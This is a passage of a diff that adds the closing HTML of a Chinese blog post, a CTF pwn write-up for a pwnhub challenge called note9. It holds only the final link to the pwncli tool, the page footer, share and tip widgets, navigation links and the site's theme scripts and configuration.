+<p>3、<a href="https://github.com/RoderickChan/pwncli"target="_blank" rel="external nofollow noopener noreferrer">pwncli<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2021-12-22 21:36:48">更新于 2021-12-22&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://www.roderickchan.cn/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/" data-title="pwnhub-12月内部赛pwn-note9-wp" data-hashtags="pwn"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://www.roderickchan.cn/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/" data-hashtag="pwn"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Linkedin" data-sharer="linkedin" data-url="https://www.roderickchan.cn/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="https://www.roderickchan.cn/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/" data-title="pwnhub-12月内部赛pwn-note9-wp" data-web><i class="fa-brands fa-whatsapp fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://www.roderickchan.cn/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/" data-title="pwnhub-12月内部赛pwn-note9-wp"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Reddit" data-sharer="reddit" data-url="https://www.roderickchan.cn/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/"><i class="fa-brands fa-reddit fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://www.roderickchan.cn/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/" data-title="pwnhub-12月内部赛pwn-note9-wp"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Instapaper" data-sharer="instapaper" data-url="https://www.roderickchan.cn/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/" data-title="pwnhub-12月内部赛pwn-note9-wp" data-description=""><i data-svg-src="/lib/simple-icons/icons/instapaper.min.svg" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.roderickchan.cn/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/" data-title="pwnhub-12月内部赛pwn-note9-wp"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="https://www.roderickchan.cn/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/" data-title="pwnhub-12月内部赛pwn-note9-wp" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 百度" data-sharer="baidu" data-url="https://www.roderickchan.cn/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/" data-title="pwnhub-12月内部赛pwn-note9-wp"><i data-svg-src="/lib/simple-icons/icons/baidu.min.svg" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.roderickchan.cn/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/" data-title="pwnhub-12月内部赛pwn-note9-wp"><i class="fa-brands fa-evernote fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/zh-cn/tags/pwn/' class="post-tag">pwn</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/zh-cn/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/zh-cn/2021-12-11-isitdtu2019-babyshellcode/" class="post-nav-item" rel="prev" title="isitdtu2019_babyshellcode"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>isitdtu2019_babyshellcode</a>
+      <a href="/zh-cn/2021-12-27-twctf-online-2019-asterisk-alloc/" class="post-nav-item" rel="next" title="TWCTF_online_2019_asterisk_alloc">TWCTF_online_2019_asterisk_alloc<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div class="post-reward">
+    <div class="comment">Buy me a coffee~</div>
+    <input type="checkbox" class="reward-input" name="reward" id="fi-reward" hidden />
+    <label class="reward-button" for="fi-reward">赞赏</label>
+    <div class="reward-ways" data-mode="fixed"><div><img loading="lazy" src="/img/reward/alipay.jpg" srcset="/img/reward/alipay.jpg, /img/reward/alipay.jpg 1.5x, /img/reward/alipay.jpg 2x" sizes="auto" data-title="roderick 支付宝" data-alt="roderick 支付宝" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/><span data-animation>支付宝</span>
+          </div><div><img loading="lazy" src="/img/reward/wechat.jpg" srcset="/img/reward/wechat.jpg, /img/reward/wechat.jpg 1.5x, /img/reward/wechat.jpg 2x" sizes="auto" data-title="roderick 微信" data-alt="roderick 微信" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/><span data-animation>微信</span>
+          </div></div>
+  </div><div id="comments"><div id="waline" class="comment"></div><noscript>
+        Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/" rel="external nofollow noopener noreferrer">Waline</a>.
+      </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.111.3">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.18"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="https://www.roderickchan.cn"target="_blank" rel="external nofollow noopener noreferrer">roderick</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"><span class="site-time" title='网站运行中……'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="run-times ms-1">网站运行中……</span></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="icp footer-divider"><a href="http://beian.miit.gov.cn/">鄂ICP备2022016286号</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><a href="https://github.com/RoderickChan" title="Follow me on Github"target="_blank" rel="external nofollow" class="github-corner right d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/waline/waline.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/waline/waline.js" defer></script><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"enable":true,"expired":false,"waline":{"copyright":true,"dark":"body[data-theme='dark']","el":"#waline","emoji":["//unpkg.com/@waline/emojis@1.1.0/weibo"],"highlighter":true,"imageUploader":false,"lang":"zh-cn","login":"enable","meta":["nick","mail","link"],"pageSize":10,"search":false,"serverURL":"https://waline-cmrfu7d4y-roderickchan.vercel.app/","texRenderer":false}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"typeit-header-subtitle-desktop":"To record and learn!","typeit-header-subtitle-mobile":"To record and learn!"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"algoliaAppID":"0UC880QNFW","algoliaIndex":"index.zh-cn","algoliaSearchKey":"c7f546f74cef1f72f861a13c1d1f97c3","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"siteTime":"2022-10-01T09:00:00+08:00","twemoji":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"typeit-header-subtitle-desktop":["typeit-header-subtitle-desktop"],"typeit-header-subtitle-mobile":["typeit-header-subtitle-mobile"]},"duration":-1,"loop":false,"speed":100},"watermark":{"appendto":".wrapper\u003emain","colspacing":30,"content":"","enable":true,"fontfamily":"inherit","fontsize":0.85,"height":21,"opacity":0.0125,"rotate":15,"rowspacing":60,"width":150}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
